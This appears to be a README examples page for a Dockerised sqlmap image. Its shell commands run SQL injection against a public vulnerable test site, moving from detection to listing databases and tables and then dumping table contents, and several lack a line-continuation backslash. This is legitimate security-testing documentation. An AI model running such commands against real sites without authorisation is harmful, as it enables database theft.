# Examples

## Target URL

Target [`http://testphp.vulnweb.com/listproducts.php?cat=1`](http://testphp.vulnweb.com/listproducts.php?cat=1 ).

```shell
docker run -it --rm \
  -u $(id -u):$(id -g) \
  -v ${PWD}/sqlmap:/.local/share/sqlmap
  ghcr.io/toshy/docker-sqlmap:latest -u "http://testphp.vulnweb.com/listproducts.php?cat=1 "
```

## Target URL - Find databases

Target [`http://testphp.vulnweb.com/listproducts.php?cat=1`](http://testphp.vulnweb.com/listproducts.php?cat=1 ) with `--dbs` flag.

```shell
docker run -it --rm \
  -u $(id -u):$(id -g) \
  -v ${PWD}/sqlmap:/.local/share/sqlmap
  ghcr.io/toshy/docker-sqlmap:latest -u "http://testphp.vulnweb.com/listproducts.php?cat=1 " --dbs
```

## Target URL - List tables

Target [`http://testphp.vulnweb.com/listproducts.php?cat=1`](http://testphp.vulnweb.com/listproducts.php?cat=1 ) with `-D <dbname>` and `--tables` flag. 

```shell
docker run -it --rm \
  -u $(id -u):$(id -g) \
  -v ${PWD}/sqlmap:/.local/share/sqlmap
  ghcr.io/toshy/docker-sqlmap:latest -u "http://testphp.vulnweb.com/listproducts.php?cat=1 " -D <dbname> --tables
```

## Target URL - List tables

Target [`http://testphp.vulnweb.com/listproducts.php?cat=1`](http://testphp.vulnweb.com/listproducts.php?cat=1 ) with `-D <dbname>` and `--tables` flag and subsequently dump table entries.

```shell
docker run -it --rm \
  -u $(id -u):$(id -g) \
  -v ${PWD}/sqlmap:/.local/share/sqlmap
  ghcr.io/toshy/docker-sqlmap:latest -u "http://testphp.vulnweb.com/listproducts.php?cat=1 " -D <dbname> --tables --dump
```

## Reference

* [GitHub Wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
